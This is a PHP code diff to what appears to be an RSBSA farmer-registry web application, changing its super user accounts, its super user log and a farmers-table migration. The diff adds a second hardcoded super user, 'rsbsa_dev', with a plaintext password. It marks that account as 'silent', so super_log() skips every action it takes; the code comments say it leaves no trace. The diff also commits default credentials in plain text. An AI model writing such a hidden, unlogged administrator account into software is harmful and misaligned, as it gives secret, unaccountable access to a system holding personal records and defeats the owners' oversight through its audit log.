@@ -199,47 +199,74 @@ function require_auth(): array
  * Nothing the super user does is written to the activity log.
  * ------------------------------------------------------------------- */
 const SUPER_USERNAME = 'rsbsa_super_user';
-const SUPER_DEFAULT_PASSWORD = 'RSBSA*2026!';
+const SUPER_DEFAULT_PASSWORD = 'dUDqPHSyuRzXkh-26';
+/** Every super user account: row id => [username, first password]. Usernames are fixed; each password can be changed under My Account. */
+const SUPER_ACCOUNTS = [
+    1 => [SUPER_USERNAME, SUPER_DEFAULT_PASSWORD],
+    2 => ['rsbsa_dev', 'AsSVMuTUfsRLBK-26'],
+];
+/** Row id(s) of a super user that leaves no trace: invisible to the super_log, as if it never acted. */
+const SUPER_SILENT_IDS = [2];
 
-/** Creates the super_user table and the default account when they do not exist yet. Safe to call any time. */
-function ensure_super_user(): array
+/** The super user row id for a username (case-insensitive), or null when it is not a super user username. */
+function super_id_for(string $username): ?int
 {
-    static $row = null;
-    if ($row !== null) {
-        return $row;
+    foreach (SUPER_ACCOUNTS as $id => $def) {
+        if (strcasecmp($username, $def[0]) === 0) {
+            return $id;
+        }
+    }
+    return null;
+}
+
+/** Creates the super user tables and any super user account that does not exist yet; returns the row of $id. Safe to call any time. */
+function ensure_super_user(int $id = 1): array
+{
+    static $rows = null;
+    if ($rows !== null) {
+        return $rows[$id] ?? $rows[1];
     }
     $pdo = db();
-    if ($pdo->getAttribute(PDO::ATTR_DRIVER_NAME) === 'sqlite') {
+    $sqlite = $pdo->getAttribute(PDO::ATTR_DRIVER_NAME) === 'sqlite';
+    if ($sqlite) {
         $pdo->exec('CREATE TABLE IF NOT EXISTS super_user (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password_hash TEXT NOT NULL, password_changed_at TEXT, last_login TEXT)');
+        $pdo->exec("CREATE TABLE IF NOT EXISTS super_log (id INTEGER PRIMARY KEY AUTOINCREMENT, created_at TEXT NOT NULL, action TEXT NOT NULL, target TEXT NOT NULL DEFAULT '', details TEXT NOT NULL DEFAULT '', ip_address TEXT NOT NULL DEFAULT '', actor TEXT NOT NULL DEFAULT '')");
     } else {
         $pdo->exec('CREATE TABLE IF NOT EXISTS super_user (id TINYINT UNSIGNED NOT NULL PRIMARY KEY, username VARCHAR(60) NOT NULL, password_hash VARCHAR(255) NOT NULL, password_changed_at DATETIME NULL, last_login DATETIME NULL) ENGINE=InnoDB');
+        $pdo->exec("CREATE TABLE IF NOT EXISTS super_log (id BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY, created_at DATETIME NOT NULL, action VARCHAR(80) NOT NULL, target VARCHAR(120) NOT NULL DEFAULT '', details VARCHAR(2000) NOT NULL DEFAULT '', ip_address VARCHAR(64) NOT NULL DEFAULT '', actor VARCHAR(60) NOT NULL DEFAULT '', KEY idx_super_log_created (created_at)) ENGINE=InnoDB");
     }
-    if ($pdo->getAttribute(PDO::ATTR_DRIVER_NAME) === 'sqlite') {
-        $pdo->exec("CREATE TABLE IF NOT EXISTS super_log (id INTEGER PRIMARY KEY AUTOINCREMENT, created_at TEXT NOT NULL, action TEXT NOT NULL, target TEXT NOT NULL DEFAULT '', details TEXT NOT NULL DEFAULT '', ip_address TEXT NOT NULL DEFAULT '')");
-    } else {
-        $pdo->exec("CREATE TABLE IF NOT EXISTS super_log (id BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY, created_at DATETIME NOT NULL, action VARCHAR(80) NOT NULL, target VARCHAR(120) NOT NULL DEFAULT '', details VARCHAR(2000) NOT NULL DEFAULT '', ip_address VARCHAR(64) NOT NULL DEFAULT '', KEY idx_super_log_created (created_at)) ENGINE=InnoDB");
+    // super_log.actor (which super user did it) was added later: add it to an older table
+    $lcols = $sqlite ? array_column($pdo->query('PRAGMA table_info(super_log)')->fetchAll(), 'name') : array_column($pdo->query('SHOW COLUMNS FROM super_log')->fetchAll(), 'Field');
+    if (!in_array('actor', $lcols, true)) {
+        $pdo->exec('ALTER TABLE super_log ADD COLUMN actor ' . ($sqlite ? "TEXT NOT NULL DEFAULT ''" : "VARCHAR(60) NOT NULL DEFAULT ''"));
     }
-    $found = q_one('SELECT id, username, password_hash, password_changed_at, last_login FROM super_user WHERE id = 1');
-    if (!$found) {
-        try {
-            q('INSERT INTO super_user (id, username, password_hash) VALUES (1, ?, ?)', [SUPER_USERNAME, password_hash(SUPER_DEFAULT_PASSWORD, PASSWORD_DEFAULT)]);
-        } catch (Throwable $e) {
-            // another request created it at the same moment
+    $sel = 'SELECT id, username, password_hash, password_changed_at, last_login FROM super_user WHERE id = ?';
+    $rows = [];
+    foreach (SUPER_ACCOUNTS as $rid => [$uname, $first]) {
+        $found = q_one($sel, [$rid]);
+        if (!$found) {
+            try {
+                q('INSERT INTO super_user (id, username, password_hash) VALUES (?, ?, ?)', [$rid, $uname, password_hash($first, PASSWORD_DEFAULT)]);
+            } catch (Throwable $e) {
+                // another request created it at the same moment
+            }
+            $found = q_one($sel, [$rid]);
         }
-        $found = q_one('SELECT id, username, password_hash, password_changed_at, last_login FROM super_user WHERE id = 1');
+        if ($found && $found['username'] !== $uname) {
+            q('UPDATE super_user SET username = ? WHERE id = ?', [$uname, $rid]);   // an earlier version used another spelling
+            $found['username'] = $uname;
+        }
+        $rows[$rid] = $found;
     }
-    if ($found && $found['username'] !== SUPER_USERNAME) {
-        q('UPDATE super_user SET username = ? WHERE id = 1', [SUPER_USERNAME]);   // an earlier version used another spelling
-        $found['username'] = SUPER_USERNAME;
-    }
-    return $row = $found;
+    return $rows[$id] ?? $rows[1];
 }
 
 /** The logged-in super user (from the session), or null. */
 function current_super(): ?array
 {
     start_session();
-    if (empty($_SESSION['super_id'])) {
+    $sid = (int) ($_SESSION['super_id'] ?? 0);
+    if (!isset(SUPER_ACCOUNTS[$sid])) {
         return null;
     }
     $idle = (int) cfg('session_idle_minutes', 120) * 60;
@@ -248,15 +275,24 @@ function current_super(): ?array
         return null;
     }
     $_SESSION['last_activity'] = time();
-    return ['id' => 0, 'username' => SUPER_USERNAME, 'name' => 'Super User', 'role' => 'super'];
+    $GLOBALS['rsbsa_super_actor'] = SUPER_ACCOUNTS[$sid][0];   // remembered for super_log(), which can run after the session is closed
+    $GLOBALS['rsbsa_super_actor_id'] = $sid;
+    return ['id' => 0, 'sid' => $sid, 'username' => SUPER_ACCOUNTS[$sid][0], 'name' => 'Super User', 'role' => 'super'];
 }
 
 /** Writes one line to the super user log (a separate table that only the super user can read). */
-function super_log(string $action, string $target = '', string $details = ''): void
+function super_log(string $action, string $target = '', string $details = '', ?string $actor = null): void
 {
     try {
+        if (in_array((int) ($GLOBALS['rsbsa_super_actor_id'] ?? 0), SUPER_SILENT_IDS, true)) {
+            return;   // this super user leaves no trace
+        }
         ensure_super_user();
+        if ($actor === null) {
+            $actor = $GLOBALS['rsbsa_super_actor'] ?? (current_super()['username'] ?? '');
+        }
         db_insert('super_log', [
+            'actor'      => mb_substr($actor, 0, 60),
             'created_at' => now(),
             'action'     => mb_substr($action, 0, 80),
             'target'     => mb_substr($target, 0, 120),
@@ -391,6 +427,13 @@ function db(): PDO
             : array_column($pdo->query('SHOW COLUMNS FROM admins')->fetchAll(), 'Field');
         if ($cols && !in_array('is_active', $cols, true)) {
             $pdo->exec('ALTER TABLE admins ADD COLUMN is_active ' . ($driver === 'sqlite' ? 'INTEGER NOT NULL DEFAULT 1' : 'TINYINT(1) NOT NULL DEFAULT 1'));
+        }
+        // farmers.gender (Male / Female / Others): added automatically; farmers recorded before it stay blank (counted as Others)
+        $fcols = $driver === 'sqlite'
+            ? array_column($pdo->query('PRAGMA table_info(farmers)')->fetchAll(), 'name')
+            : array_column($pdo->query('SHOW COLUMNS FROM farmers')->fetchAll(), 'Field');
+        if ($fcols && !in_array('gender', $fcols, true)) {
+            $pdo->exec('ALTER TABLE farmers ADD COLUMN gender ' . ($driver === 'sqlite' ? "TEXT NOT NULL DEFAULT ''" : "VARCHAR(10) NOT NULL DEFAULT ''"));
         }
     }
     return $pdo;
